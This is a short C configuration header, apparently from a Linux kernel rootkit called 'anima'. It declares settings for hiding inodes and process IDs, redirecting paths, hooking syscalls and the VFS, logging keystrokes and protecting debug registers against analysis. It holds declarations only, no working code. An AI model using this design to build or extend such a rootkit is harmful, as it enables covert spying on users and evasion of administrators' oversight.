#ifndef __CONFIG_H
#define __CONFIG_H

#define MAX_HIDDEN_INODES 1024
#define MAX_HIDDEN_PIDS   1024
#define MAX_PATH_LEN	  512
#define MAX_PATH_REDIRECT 32
#define KEYLOGGER_BUFLEN  2048

struct anima_config {
	int state;
#define RK_BOOT		0
#define RK_ACTIVE	1
#define RK_SHUTDOWN	2

#ifdef ARCH_X86
	int dr_protect;		/* DR access protection */
	int patch_debug;	/* 1 => patch_debug, 0 => die_notifier */
#endif

	int hook_syscall;
	int hook_vfs;
	int keylogger;
};
extern struct anima_config rk_cfg;

#endif
